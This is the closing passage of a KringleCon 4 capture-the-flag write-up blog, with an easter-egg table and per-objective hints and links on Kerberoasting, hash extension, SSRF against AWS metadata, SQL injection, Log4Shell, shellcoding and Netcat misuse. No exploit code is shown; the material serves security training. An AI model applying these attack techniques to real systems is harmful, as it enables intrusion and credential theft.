<td>We can access a hidden floor by changing the button <em>ID</em>s client side. The room display a big &ldquo;LOL&rdquo; on the floor and an image of a turtle as background. The areas is called &ldquo;__Shenanigans__&rdquo;. The image represents <strong>Great A&rsquo;Tuin</strong>, the <em>Giant Star Turtle</em> who travels through the <em>Discworld</em> universe&rsquo;s space. <figure >
  
  
  
    <img data-src="/images/kringlecon4/easter/turtles.webp"  data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
</figure></td>
</tr>
<tr>
<td>The Third Kind</td>
<td>The name of the location refers to the <strong>Spielberg</strong> movie <em>Close Encounters of the Third Kind</em></td>
</tr>
<tr>
<td>Objective 2</td>
<td>The objective name refers to Carmen San Diego books, games and cartoons</td>
</tr>
<tr>
<td>Objective 2</td>
<td>An <em>HTTP</em> cookie is called <em>Cookiepella</em>, which refers to the group <em>Rockapella</em> who took part in a Carmen Sandiego game show</td>
</tr>
<tr>
<td>Objective 3</td>
<td>The Nidus Thermostat refers to the <a href="https://store.google.com/product/nest_learning_thermostat_3rd_gen">Google Nest Thermostat</a></td>
</tr>
<tr>
<td>Objective 7</td>
<td>One of the printed file refers to the famous book <em>How to Win Friends and Influence People</em></td>
</tr>
<tr>
<td>Objective 7</td>
<td>The message <code>follow the white rabbit...</code> is a ref to <em>Matrix</em> and/or <em>Alice in Wonderland</em></td>
</tr>
<tr>
<td>Objective 7</td>
<td>The image of a bird on a knob found in /var/spool/birdknob.png <figure >
  
  
  
    <img data-src="/images/kringlecon4/easter/birdknob.webp"  data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
</figure></td>
</tr>
<tr>
<td>Objective 10</td>
<td>The region where the server is located, np-north-1, is a fictional <em>AWS North Pole</em> region</td>
</tr>
<tr>
<td>Objective 13</td>
<td>The sentence that the doll must say &ldquo;Let me talk to your manager&rdquo; refers to memes found all over the <em>Internet</em></td>
</tr>
<tr>
<td>Terminal 5</td>
<td>The game Santa&rsquo;s Holiday Hero game refers to the game Guitar Hero</td>
</tr>
</tbody>
</table>
<h2 id="ressources-and-hints">Ressources and hints</h2>
<hr />
<h5 id="objective-2">Objective 2</h5>
<ul>
<li>Coordinate Systems - Don&rsquo;t forget coordinate systems other than lat/long like <a href="https://en.wikipedia.org/wiki/Military_Grid_Reference_System">MGRS</a> and <a href="https://what3words.com/">what3words</a>.</li>
<li>Flask Cookies - While Flask cookies can&rsquo;t generally be forged without the secret, they can often be <a href="https://gist.github.com/chriselgee/b9f1861dd9b99a8c1ed30066b25ff80b">decoded and read</a>.</li>
<li>OSINT Talk - Clay Moody is giving <a href="https://www.youtube.com/watch?v=tAot_mcBT9c">a talk</a> about OSINT techniques right now!</li>
</ul>
<h5 id="objective-3">Objective 3</h5>
<ul>
<li>Linux Wi-Fi Commands - The <a href="https://linux.die.net/man/8/iwlist"><code>iwlist</code></a> and <a href="https://linux.die.net/man/8/iwconfig"><code>iwconfig</code></a> utilities are key for managing Wi-Fi from the Linux command line.</li>
<li>Web Browsing with cURL - <a href="https://linux.die.net/man/1/curl">cURL</a> makes HTTP requests from a terminal - in Mac, Linux, and modern Windows!</li>
<li>Adding Data to cURL requests - When sending a <a href="https://www.educative.io/edpresso/how-to-perform-a-post-request-using-curl"><em>POST</em> request with data</a>, add <code>--data-binary</code> to your <code>curl</code> command followed by the data you want to send.</li>
</ul>
<h5 id="objective-4">Objective 4</h5>
<ul>
<li>Parameter Tampering - It seems they&rsquo;re susceptible to <a href="https://owasp.org/www-community/attacks/Web_Parameter_Tampering">parameter tampering</a>.</li>
<li>Intercepting Proxies - Web application testers can use tools like <a href="https://portswigger.net/burp/communitydownload">Burp Suite</a> or even right in the browser with Firefox&rsquo;s <a href="https://itectec.com/superuser/how-to-edit-parameters-sent-through-a-form-on-the-firebug-console/">Edit and Resend</a> feature.</li>
</ul>
<h5 id="objective-5">Objective 5</h5>
<ul>
<li><a href="https://hak5.org/products/usb-rubber-ducky-deluxe">https://hak5.org/products/usb-rubber-ducky-deluxe</a></li>
</ul>
<h5 id="objective-6">Objective 6</h5>
<ul>
<li>Shellcode Primer Primer - If you run into any shellcode primers at the North Pole, be sure to read the directions and the comments in the shellcode source!</li>
<li>Debugging Shellcode - Also, troubleshooting shellcode can be difficult. Use the debugger step-by-step feature to watch values.</li>
<li>Register Stomping - Lastly, be careful not to overwrite any register values you need to reference later on in your shellcode.</li>
</ul>
<h5 id="objective-7">Objective 7</h5>
<ul>
<li>Printer Firmware - When analyzing a device, it&rsquo;s always a good idea to pick apart the firmware. Sometimes these things come down Base64-encoded.</li>
<li>Hash Extension Attacks - <a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">Hash Extension Attacks</a> can be super handy when there&rsquo;s some type of validation to be circumvented.</li>
<li>Dropping Files - Files placed in <code>/app/lib/public/incoming</code> will be accessible under <a href="https://printer.kringlecastle.com/incoming/">https://printer.kringlecastle.com/incoming/</a>.</li>
<li><a href="https://ngrok.com/">https://ngrok.com/</a></li>
<li><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#tldr-cheatsheet">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#tldr-cheatsheet</a></li>
</ul>
<h5 id="objective-8">Objective 8</h5>
<ul>
<li>Kerberoast and AD Abuse Talk - Check out <a href="https://www.youtube.com/watch?v=iMh8FTzepU4">Chris Davis' talk</a> <a href="https://github.com/chrisjd20/hhc21_powershell_snippets">and scripts</a> on Kerberoasting and Active Directory permissions abuse.</li>
<li>Kerberoasting and Hashcat Syntax - Learn about <a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">Kerberoasting</a> to leverage domain credentials to get usernames and crackable hashes for service accounts.</li>
<li>Finding Domain Controllers - There will be some <code>10.X.X.X</code> networks in your routing tables that may be interesting. Also, consider adding <code>-PS22,445</code> to your <code>nmap</code> scans to &ldquo;fix&rdquo; default probing for unprivileged scans.</li>
<li>Hashcat Mangling Rules - <a href="https://github.com/NotSoSecure/password_cracking_rules">OneRuleToRuleThemAll.rule</a> is great for mangling when a password dictionary isn&rsquo;t enough.</li>
<li>CeWL for Wordlist Creation - <a href="https://github.com/digininja/CeWL">CeWL</a> can generate some great wordlists from website, but it will ignore digits in terms by default.</li>
<li>Stored Credentials - Administrators often store credentials in scripts. These can be coopted by an attacker for other purposes!</li>
<li>Active Directory Interrogation - Investigating Active Directory errors is harder without <a href="https://github.com/BloodHoundAD/BloodHound">Bloodhound</a>, but there are <a href="https://social.technet.microsoft.com/Forums/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell">native</a> <a href="https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf">methods</a>.</li>
</ul>
<h5 id="objective-9">Objective 9</h5>
<ul>
<li>GitHub Monitoring in Splunk - Between GitHub audit log and webhook event recording, you can monitor all activity in a repository, including common <code>git</code> commands such as <code>git add</code>, <code>git status</code>, and <code>git commit</code>.</li>
<li>Sysmon Monitoring in Splunk - Sysmon network events don&rsquo;t reveal the process parent ID for example. Fortunately, we can pivot with a query to investigate process creation events once you get a process ID.</li>
<li>Malicious NetCat?? - Did you know there are multiple versions of the Netcat command that can be used maliciously? <code>nc.openbsd</code>, for example.</li>
</ul>
<h5 id="objective-10">Objective 10</h5>
<ul>
<li>AWS IMDS Documentation - The <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html">AWS documentation for IMDS</a> is interesting reading.</li>
<li><a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery">https://owasp.org/www-community/attacks/Server_Side_Request_Forgery</a></li>
<li><a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html">https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html</a></li>
</ul>
<h5 id="objective-11">Objective 11</h5>
<ul>
<li>Evil Bit RFC - <a href="https://datatracker.ietf.org/doc/html/rfc3514">RFC3514</a> defines the usage of the &ldquo;Evil Bit&rdquo; in IPv4 headers.</li>
<li>Wireshark Display Filters - Different from BPF capture filters, Wireshark&rsquo;s <a href="https://wiki.wireshark.org/DisplayFilters">display filters</a> can find text with the <code>contains</code> keyword - and evil bits with <code>ip.flags.rb</code>.</li>
</ul>
<h5 id="objective-12">Objective 12</h5>
<ul>
<li>SQL Injection with Source - When you have the source code, API documentation becomes <a href="https://www.npmjs.com/package/express-session">tremendously</a> <a href="https://github.com/mysqljs/mysql">valuable</a>.</li>
</ul>
<h5 id="objective-13">Objective 13</h5>
<ul>
<li>FPGA for Fun - There are <a href="https://www.fpga4fun.com/MusicBox.html">FPGA enthusiast sites</a>.</li>
<li>FPGA Talk - Prof. Qwerty Petabyte is giving <a href="https://www.youtube.com/watch?v=GFdG1PJ4QjA">a lesson</a> about Field Programmable Gate Arrays (FPGAs).</li>
</ul>
<h5 id="terminal-2">Terminal 2</h5>
<ul>
<li>Grep Cheat Sheet - Check <a href="https://ryanstutorials.net/linuxtutorial/cheatsheetgrep.php">this</a> out if you need a <code>grep</code> refresher.</li>
</ul>
<h5 id="terminal-3">Terminal 3</h5>
<ul>
<li>Boolean Logic - There are lots of special symbols for logic and set notation. <a href="http://notes.imt-decal.org/sets/cheat-sheet.html">This one</a> covers <em>AND</em>, <em>NOT</em>, and <em>OR</em> at the bottom.</li>
<li>AND, OR, NOT, XOR - <a href="http://www.natna.info/English/Teaching/CSI30-materials/Chapter1-cheat-sheet.pdf">This</a> might be a handy reference too.</li>
</ul>
<h5 id="terminal-4">Terminal 4</h5>
<ul>
<li>IPv6 Reference - Check out <a href="https://gist.github.com/chriselgee/c1c69756e527f649d0a95b6f20337c2f">this Github Gist</a> with common tools used in an IPv6 context.</li>
</ul>
<h5 id="terminal-5">Terminal 5</h5>
<ul>
<li>Ducky Script - <a href="https://docs.hak5.org/hc/en-us/articles/360010555153-Ducky-Script-the-USB-Rubber-Ducky-language">Ducky Script</a> is the language for the USB Rubber Ducky</li>
<li>Duck Encoder - Attackers can encode Ducky Script using a <a href="https://docs.hak5.org/hc/en-us/articles/360010471234-Writing-your-first-USB-Rubber-Ducky-Payload">duck encoder</a> for delivery as <code>inject.bin</code>.</li>
<li>Ducky RE with Mallard - It&rsquo;s also possible the reverse engineer encoded <em>Ducky Script</em> using <a href="https://github.com/dagonis/Mallard">Mallard</a>.</li>
<li>Mitre ATT&amp;CK™ and Ducky - The <a href="https://attack.mitre.org/techniques/T1098/004/"><em>MITRE ATT&amp;CK™</em> tactic T1098.004</a> describes <em>SSH</em> persistence techniques through authorized keys files.</li>
</ul>
<h5 id="terminal-10">Terminal 10</h5>
<ul>
<li>Lever Requirements - Not sure what a lever requires? Click it in the <code>Current Level Objectives</code> panel.</li>
<li>Moving the Elf - You can move the elf with commands like <code>elf.moveLeft(5)</code>, <code>elf.moveTo({&quot;x&quot;:2,&quot;y&quot;:2})</code>, or <code>elf.moveTo(lever0.position)</code>.</li>
<li>Bumping into Walls - Looping through long movements? Don&rsquo;t be afraid to <code>moveUp(99)</code> or whatever. You elf will stop at any obstacle.</li>
<li>Function Calls - You can call functions like <code>myFunction()</code>. If you ever need to pass a function to a munchkin, you can use <code>myFunction</code> without the <code>()</code>.</li>
</ul>
<h5 id="terminal-12a">Terminal 12a</h5>
<ul>
<li>Log4J at Apache - Software by the <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Apache Foundation</a> runs on devices all over the internet</li>
<li>Log4j Search Script - Josh Wright&rsquo;s <a href="https://gist.github.com/joswr1ght/a6badf9b0b148efadfccbf967fcc2b41">simple checker script</a> uses the power of regex to find vulnerable Log4j libraries!</li>
<li>Log4j Talk - Prof. Qwerty Petabyte is giving <a href="https://youtu.be/OuYMPU3-0p4">a lesson</a> about Apache Log4j.</li>
<li>Log4j Remediation - <a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/">Clearing Log4j issues</a> from systems.</li>
<li><a href="https://snyk.io/log4j-vulnerability-resources/">https://snyk.io/log4j-vulnerability-resources/</a></li>
</ul>
<h5 id="terminal-12b">Terminal 12b</h5>
<ul>
<li>Log4j Discussion with Bishop Fox - Join Bishop Fox for <a href="https://bishopfox.com/blog/log4j-zero-day-cve-2021-44228">a discussion</a> of the issues involved.</li>
<li>Log4j Red Help Document - Josh Wright&rsquo;s <a href="https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4">help document</a> for the Red challenge.</li>
<li><a href="https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228">https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228</a></li>
<li><a href="https://www.winmill.com/blog/2021/12/27/how-to-test-your-own-vulnerability-to-the-log4shell-attack-chain-in-apache-solr/">https://www.winmill.com/blog/2021/12/27/how-to-test-your-own-vulnerability-to-the-log4shell-attack-chain-in-apache-solr/</a></li>
</ul>

    </article>
    
    
<script defer src="/js/clipboard.min.1626706afc88d95ebe1173b553ec732c6dc82a576989315fdf5e7779af738a44.js"></script>

<script defer src="/js/helper/prev.min.js"></script>

<script defer src="/js/helper/prop.min.js"></script>
<script>
  'use strict';
  document.addEventListener('DOMContentLoaded', function () {
    
    var clipInit = false;
    var preChromaElem = document.querySelectorAll('pre.chroma');
    var langCodeElem = document.querySelectorAll('.language-code');
    var dollarCodeElem = document.querySelectorAll('div.language-\\$');
    var gtCodeElem = document.querySelectorAll('div.language-\\>');

    var makeClipboard = function(elem) {
      var code = elem,
          text = elem.textContent;
        
      if (text.length > 15) {
        if (!clipInit) {
          var text, clip = new ClipboardJS('.copy-to-clipboard', {
            text: function (trigger) {
              var codeElem = prev(trigger).querySelectorAll('code');
              if (codeElem.length > 1) {
                text = prev(trigger).querySelector('code[class^="language-"]').textContent;
              } else {
                text = prev(trigger).querySelector('code').textContent;
              }

              return text.replace(/^\$\s/gm, '');
            }
          });

          var inPre;
          clip.on('success', function (e) {
            e.clearSelection();
            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
            e.trigger.setAttribute('aria-label', 'Copied to clipboard!');
            e.trigger.classList.add('tooltipped');
            e.trigger.classList.add('tooltipped-w');
          });

          clip.on('error', function (e) {
            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
            e.trigger.setAttribute('aria-label', e.action.toString());
            e.trigger.classList.add('tooltipped');
            e.trigger.classList.add('tooltipped-w');
          });

          clipInit = true;
        }

        var notAllowedClass = ['language-mermaid', 'language-viz', 'language-wave', 'language-chart', 'language-msc', 'language-flowchart'];
        var isNotAllowedIncluded = false;
        var curClassName = code.getAttribute('class');

        for (var i = 0; i < notAllowedClass.length; i++) {
          if (curClassName && curClassName.startsWith(notAllowedClass[i])) {
            isNotAllowedIncluded = true;
            break;
          }
        }

        if (!isNotAllowedIncluded) {
          if (curClassName) {
            var newClipboardElem = document.createElement('span');
            newClipboardElem.setAttribute('class', 'copy-to-clipboard');
            newClipboardElem.setAttribute('title', 'Copy to clipboard');
            elem.parentNode.parentNode.insertBefore(newClipboardElem, elem.parentNode.nextElementSibling);
          }
        }
      }
    }

    var makeSymbolClipboard = function(elem) {
      var clipboardSpan = document.createElement('span');
      clipboardSpan.setAttribute('class', 'copy-to-clipboard');
      clipboardSpan.setAttribute('title', 'Copy to clipboard');
      elem.parentNode.parentNode.insertBefore(clipboardSpan, elem.parentNode.nextElementSibling);
    }

    preChromaElem ? 
    preChromaElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function(codeElem) {
        makeClipboard(codeElem);
      });
    }) : null;
    
    langCodeElem ? 
    langCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeClipboard(codeElem);
      });
    }) : null;

    dollarCodeElem ? 
    dollarCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeSymbolClipboard(codeElem);
      });
    }) : null;

    gtCodeElem ?
    gtCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeSymbolClipboard(codeElem);
      });
    }) : null;
    
  });
</script>
    <script>
  'use strict';
  
  function wrap(el, wrapper) {
    el.parentNode.insertBefore(wrapper, el);
    wrapper.appendChild(el);
  }

  (function () {
    var singleContentsElem = document.querySelector('.single__contents');
    singleContentsElem ? 
    singleContentsElem.querySelectorAll('pre > code').forEach(function(elem) {
      var dataLang = elem.getAttribute('data-lang');
      var dataLangWrapper = document.createElement('div');
      var code = null;
      var codeTitle = null;

      if (dataLang && dataLang.includes(':')) {
        code = dataLang.split(':')[0];
        codeTitle = dataLang.split(':')[1];

        dataLangWrapper.className = 'language-' + code;
        dataLangWrapper.setAttribute('data-lang', codeTitle);

        elem.className = 'language-' + code;
        elem.setAttribute('data-lang', codeTitle);
        elem.setAttribute('id', codeTitle);
      } else if (!dataLang) {
        dataLangWrapper.setAttribute('data-lang', 'Code');
        dataLangWrapper.className = 'language-code';
      }

      if (!dataLang || codeTitle) {
        wrap(elem.parentNode, dataLangWrapper);
      }

    }) : null;
  })();

  var langCodeElem = document.querySelectorAll('.language-code');
  langCodeElem ? langCodeElem.forEach(function (elem) {
    var newElem = document.createElement('span');
    newElem.className = 'copy-to-clipboard';
    newElem.setAttribute('title', 'Copy to clipboard');
    elem.append(newElem);
  }) : null;
  

  

  
  var dollarCodeElem = document.querySelectorAll('div.language-\\$');
  var gtCodeElem = document.querySelectorAll('div.language-\\>');

  dollarCodeElem ?
  dollarCodeElem.forEach(function(elem) {
    var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
    lnts ? 
    lnts.forEach(function(lnt) {
      lnt.innerHTML = '$<br/>';
    }) : null;
  }) : null;

  gtCodeElem ?
  gtCodeElem.forEach(function(elem) {
    var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
    lnts ? 
    lnts.forEach(function(lnt) {
      lnt.innerHTML = '><br/>';
    }) : null;
  }) : null;
  
</script>
    
<div class="donation">
  <div class="donation__message">
    Share on
  </div>
  <div class="donation__icons">
    
    
    
      
        <a href="https://twitter.com/intent/tweet?text=KringleCon%204%3a%20Calling%20Birds&url=https%3a%2f%2fnoobintheshell.com%2fposts%2fkringlecon4%2f&hashtags=kringlecon%2cholidayhack&via=noobintheshell_" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
          <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
        </a>
      
    
      
        <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fnoobintheshell.com%2fposts%2fkringlecon4%2f&title=KringleCon%204%3a%20Calling%20Birds &summary=The%20fourth%20edition%20of%20Kringlecon%21%20This%20year%20challenges%20were%20covering%20webapp%20hacking%20%28SQLi%2c%20SSRF%29%2c%20binary%20analysis%2c%20digital%20forensics%20%28logs%20and%20network%20capture%20analysis%29%2c%20Active%20Directory%20attacks%2c%20learning%20Python%20and%20shellcoding%2c%20some%20encryption%20attack%2c%20analyzing%20an%20IMDS%20service%20and%20FPGA%20programming.%20Two%20challenges%20on%20Log4Shell%20were%20added%20as%20well%20during%20the%20challenge.&source=Cybersecurity%20blog%20and%20CTF%20write-ups" target="_blank" rel="noreferrer" title="LinkedIn" aria-label="LinkedIn Share Button" class="donation__item" data-type="share">
          <svg data-name="linkedin" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m23.994 24v-.001h.006v-8.802c0-4.306-.927-7.623-5.961-7.623-2.42 0-4.044 1.328-4.707 2.587h-.07v-2.185h-4.773v16.023h4.97v-7.934c0-2.089.396-4.109 2.983-4.109 2.549 0 2.587 2.384 2.587 4.243v7.801z"/><path d="m.396 7.977h4.976v16.023h-4.976z"/><path d="m2.882 0c-1.591 0-2.882 1.291-2.882 2.882s1.291 2.909 2.882 2.909 2.882-1.318 2.882-2.909c-.001-1.591-1.292-2.882-2.882-2.882z"/></svg>
        </a>
      
    
      
        <a href="https://www.reddit.com/submit?url=https%3a%2f%2fnoobintheshell.com%2fposts%2fkringlecon4%2f&amp;title=KringleCon%204%3a%20Calling%20Birds" target="_blank" rel="noreferrer" title="Reddit" aria-label="Reddit Share Button" onclick="window.open('http://www.reddit.com/submit?url=' + encodeURIComponent(document.URL) + '&amp;title=' +  encodeURIComponent(document.title)); return false;" class="donation__item" data-type="share">
          <svg data-name="reddit" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.325 9.308c-.758 0-1.425.319-1.916.816-1.805-1.268-4.239-2.084-6.936-2.171l1.401-6.406 4.461 1.016c0 1.108.89 2.013 1.982 2.013 1.113 0 2.008-.929 2.008-2.038s-.889-2.038-2.007-2.038c-.779 0-1.451.477-1.786 1.129l-4.927-1.108c-.248-.067-.491.113-.557.365l-1.538 7.062c-2.676.113-5.084.928-6.895 2.197-.491-.518-1.184-.837-1.942-.837-2.812 0-3.733 3.829-1.158 5.138-.091.405-.132.837-.132 1.268 0 4.301 4.775 7.786 10.638 7.786 5.888 0 10.663-3.485 10.663-7.786 0-.431-.045-.883-.156-1.289 2.523-1.314 1.594-5.115-1.203-5.117zm-15.724 5.41c0-1.129.89-2.038 2.008-2.038 1.092 0 1.983.903 1.983 2.038 0 1.109-.89 2.013-1.983 2.013-1.113.005-2.008-.904-2.008-2.013zm10.839 4.798c-1.841 1.868-7.036 1.868-8.878 0-.203-.18-.203-.498 0-.703.177-.18.491-.18.668 0 1.406 1.463 6.07 1.488 7.537 0 .177-.18.491-.18.668 0 .207.206.207.524.005.703zm-.041-2.781c-1.092 0-1.982-.903-1.982-2.011 0-1.129.89-2.038 1.982-2.038 1.113 0 2.008.903 2.008 2.038-.005 1.103-.895 2.011-2.008 2.011z"/></svg>
        </a>
      
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fnoobintheshell.com%2fposts%2fkringlecon4%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
          <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
        </a>
      
    
  </div>
</div>


    
    
<div class="whoami__gutter"></div>
<hr class="hr-slash whoami-hr"/>
<section class="whoami">
  <div class="whoami__image-wrapper">
    
    
      
        <img data-src="/images/whoami/avatar.jpg" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" alt="Avatar" class="lazyload whoami__image"/>
      
    
  </div>
  <div class="whoami__contents">
    <div class="whoami__written-by">
      WRITTEN BY
    </div>
    <div class="whoami__title">
      
        noobintheshell
      
    </div>
    <div class="whoami__desc">
      
        AppSec Engineer and CTFer
      
    </div>
    <div class="whoami__social">
      
      
      
      
      
      
      
      
      <a href="javascript:location.href%20=%20%27mailto:%27%20&#43;%20[%27noobintheshell%27,%27protonmail.com%27].join%28%27@%27%29" title="email" aria-label="email">
        <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-.4 4.25l-7.07 4.42c-.32.2-.74.2-1.06 0L4.4 8.25c-.25-.16-.4-.43-.4-.72 0-.67.73-1.07 1.3-.72L12 11l6.7-4.19c.57-.35 1.3.05 1.3.72 0 .29-.15.56-.4.72z"/></svg>
      </a>
      
      
      
      
      
      
      
      <a href="https://github.com/noobintheshell" title="github" aria-label="github">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 24 24" version="1.1">
<g id="surface3680">
<path fill="currentColor" d="M 10.898438 2.101562 C 6.300781 2.601562 2.601562 6.300781 2.101562 10.800781 C 1.601562 15.5 4.300781 19.699219 8.398438 21.300781 C 8.699219 21.398438 9 21.199219 9 20.800781 L 9 19.199219 C 9 19.199219 8.601562 19.300781 8.101562 19.300781 C 6.699219 19.300781 6.101562 18.101562 6 17.398438 C 5.898438 17 5.699219 16.699219 5.398438 16.398438 C 5.101562 16.300781 5 16.300781 5 16.199219 C 5 16 5.300781 16 5.398438 16 C 6 16 6.5 16.699219 6.699219 17 C 7.199219 17.800781 7.800781 18 8.101562 18 C 8.5 18 8.800781 17.898438 9 17.800781 C 9.101562 17.101562 9.398438 16.398438 10 16 C 7.699219 15.5 6 14.199219 6 12 C 6 10.898438 6.5 9.800781 7.199219 9 C 7.101562 8.800781 7 8.300781 7 7.601562 C 7 7.199219 7 6.601562 7.300781 6 C 7.300781 6 8.699219 6 10.101562 7.300781 C 10.601562 7.101562 11.300781 7 12 7 C 12.699219 7 13.398438 7.101562 14 7.300781 C 15.300781 6 16.800781 6 16.800781 6 C 17 6.601562 17 7.199219 17 7.601562 C 17 8.398438 16.898438 8.800781 16.800781 9 C 17.5 9.800781 18 10.800781 18 12 C 18 14.199219 16.300781 15.5 14 16 C 14.601562 16.5 15 17.398438 15 18.300781 L 15 20.898438 C 15 21.199219 15.300781 21.5 15.699219 21.398438 C 19.398438 19.898438 22 16.300781 22 12.101562 C 22 6.101562 16.898438 1.398438 10.898438 2.101562 Z M 10.898438 2.101562 "/>
</g>
</svg>

      </a>
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      <a href="https://twitter.com/noobintheshell_" title="twitter" aria-label="twitter">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 32 32" version="1.1">
<g id="surface676">
